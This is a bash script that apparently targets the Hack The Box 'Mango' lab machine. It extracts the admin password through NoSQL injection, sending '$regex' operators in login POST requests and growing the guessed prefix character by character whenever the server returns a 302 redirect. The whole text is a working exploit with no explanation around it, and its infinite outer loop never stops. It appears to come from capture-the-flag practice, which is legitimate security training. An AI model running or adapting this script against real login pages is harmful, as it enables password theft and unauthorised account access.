#!/bin/bash

characters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@%^()@_{}#';
url="http://staging-order.mango.htb/";

payload="";

while true; do

    for c in $( echo $characters  | sed -e 's/\(.\)/\1\n/g'); do

        code2=$(curl -i $url -X POST --data 'username=admin&password[$regex]='$payload$c'.*' -w '%{http_code}\n' -s | tail -n 1)
        echo $code2

        if [ $code2 -eq 302 ]; then
            payload=$payload$c;
            echo "Payload: $payload";
        fi
    done;
done;
